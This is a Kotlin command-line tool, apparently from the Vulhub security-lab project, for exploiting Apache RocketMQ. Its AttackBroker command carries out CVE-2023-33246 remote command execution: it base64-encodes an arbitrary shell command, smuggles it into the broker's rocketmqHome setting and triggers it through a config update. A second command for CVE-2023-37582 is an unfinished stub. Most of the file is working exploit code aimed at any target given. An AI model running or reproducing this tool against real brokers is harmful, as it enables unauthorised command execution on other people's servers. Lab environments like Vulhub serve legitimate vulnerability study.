package org.vulhub

import com.github.ajalt.clikt.core.CliktCommand
import com.github.ajalt.clikt.core.subcommands
import com.github.ajalt.clikt.parameters.options.option
import com.github.ajalt.clikt.parameters.options.required
import com.github.ajalt.clikt.parameters.options.help
import org.apache.rocketmq.tools.admin.DefaultMQAdminExt
import java.util.Base64
import java.util.Properties

class RocketMQAttack : CliktCommand(
    name = "rocketmq-attack",
    help = "A tool for executing commands on RocketMQ brokers and nameservers"
) {
    override fun run() = Unit
}

abstract class BaseAttackCommand(
    name: String,
    help: String
) : CliktCommand(name = name, help = help) {
    protected val target by option("-t", "--target")
        .help("Target address (host:port)")
        .required()
    
    protected val cmd by option("-c", "--cmd")
        .help("Command to execute")
        .required()

    protected fun getCmd(cmd: String): String {
        val cmdBase = Base64.getEncoder().encodeToString(cmd.toByteArray())
        return "-c \$@|sh . echo echo \"$cmdBase\"|base64 -d|sh -i;"
    }
}

class AttackBroker : BaseAttackCommand(
    name = "AttackBroker",
    help = "Execute commands on RocketMQ broker (CVE-2023-33246)"
) {
    override fun run() {
        echo("Executing command $cmd on broker $target")
        val admin = DefaultMQAdminExt()
        try {
            admin.start()
            val props = Properties().apply {
                setProperty("rocketmqHome", getCmd(cmd))
                setProperty("filterServerNums", "1")
            }
            
            admin.updateBrokerConfig(target, props)
            val brokerConfig = admin.getBrokerConfig(target)
            echo("Command executed successfully")
            echo("rocketmqHome: ${brokerConfig.getProperty("rocketmqHome")}")
            echo("filterServerNums: ${brokerConfig.getProperty("filterServerNums")}")
        } catch (e: Exception) {
            echo("Error: ${e.message}", err = true)
            System.exit(1)
        } finally {
            admin.shutdown()
        }
    }
}

class AttackNamesrv : BaseAttackCommand(
    name = "AttackNamesrv",
    help = "Attack RocketMQ nameserver (CVE-2023-37582)"
) {
    override fun run() {
        echo("Attack nameserver $target")
        // TODO: complete it CVE-2023-37582
        // https://github.com/Malayke/CVE-2023-37582_EXPLOIT
    }
}

fun main(args: Array<String>) = RocketMQAttack()
    .subcommands(AttackBroker(), AttackNamesrv())
    .main(args)